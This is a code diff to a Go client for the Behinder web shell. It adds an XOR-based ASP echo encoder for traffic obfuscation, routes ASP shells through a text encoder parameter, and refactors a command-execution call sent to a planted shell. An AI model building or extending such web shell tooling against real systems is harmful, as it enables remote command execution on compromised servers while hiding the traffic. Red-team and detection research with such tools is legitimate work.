@@ -47,6 +47,11 @@ var defaultPHPEchoEncoder codecFunc = func(raw []byte) ([]byte, error) {
 	return []byte(classBase64Str), nil
 }
 
+var defaultASPEchoEncoder codecFunc = func(raw []byte) ([]byte, error) {
+	aspCode := "Function Encrypt(data)\nkey=Session(\"k\")\nsize=len(data)\nFor i=1 To size\nencryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))\nNext\nEncrypt=encryptResult\nEnd Function"
+	return []byte(aspCode), nil
+}
+
 func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
 	bs := &Behinder{
 		Url:           ys.GetUrl(),
@@ -69,6 +74,10 @@ func (b *Behinder) echoResultEncode(raw []byte) ([]byte, error) {
 	if (b.customPacketEncoder == nil && b.customEchoDecoder == nil) && len(b.PayloadScriptContent) == 0 {
 		if b.ShellScript == ypb.ShellScript_PHP.String() {
 			b.customEchoEncoder = defaultPHPEchoEncoder
+		}
+
+		if b.ShellScript == ypb.ShellScript_ASP.String() {
+			b.customEchoEncoder = defaultASPEchoEncoder
 		}
 	}
 	if b.customEchoEncoder != nil {
@@ -308,11 +317,13 @@ func (b *Behinder) String() string {
 func (b *Behinder) processParams(params map[string]string) {
 	value, _ := b.echoResultEncode([]byte(""))
 	if len(value) != 0 {
-		if b.ShellScript == ypb.ShellScript_ASPX.String() {
+		switch b.ShellScript {
+		case ypb.ShellScript_ASPX.String():
+			// todo
 			params["decoderAssemblyBase64"] = string(value)
-		} else if b.ShellScript == ypb.ShellScript_JSP.String() || b.ShellScript == ypb.ShellScript_JSPX.String() {
+		case ypb.ShellScript_JSP.String(), ypb.ShellScript_JSPX.String():
 			params["customEncoderFromClass"] = string(value)
-		} else if b.ShellScript == ypb.ShellScript_PHP.String() {
+		case ypb.ShellScript_PHP.String(), ypb.ShellScript_ASP.String():
 			params["customEncoderFromText"] = string(value)
 		}
 	}
@@ -406,10 +417,9 @@ func (b *Behinder) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) 
 }
 
 func (b *Behinder) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([]byte, error) {
-	params := map[string]string{
-		"cmd":  cmd,
-		"path": "C:/",
-	}
+	params := map[string]string{}
+	params["cmd"] = cmd
+	params["path"] = "C:/"
 	b.processParams(params)
 	return b.sendRequestAndGetResponse(payloads.CmdGo, params)
 }
